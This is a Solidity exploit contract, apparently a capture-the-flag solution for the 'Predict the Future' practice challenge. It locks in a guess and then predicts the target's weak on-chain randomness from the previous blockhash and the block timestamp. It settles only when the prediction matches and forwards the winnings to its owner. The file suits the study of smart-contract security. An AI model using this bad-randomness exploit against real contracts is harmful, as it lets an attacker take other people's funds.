// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract PredictTheFutureHacker {
    IPredictTheFutureChallenge public challenge;
    address payable public owner;

    constructor(address challengeAddress) payable {
        require(msg.value >= 1, "You need to send at least one ether");
        challenge = IPredictTheFutureChallenge(challengeAddress);
        owner = msg.sender;
    }

    function lockInGuess(uint8 n) external payable {
        require(
            address(this).balance >= 1 ether,
            "This contract does not have enough funds"
        );
        challenge.lockInGuess{value: 1 ether}(n);
    }

    function exploit(uint8 n) external payable {
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;

        if (answer == n) {
            challenge.settle();
        }

        owner.transfer(address(this).balance);
    }

    receive() external payable {}
}
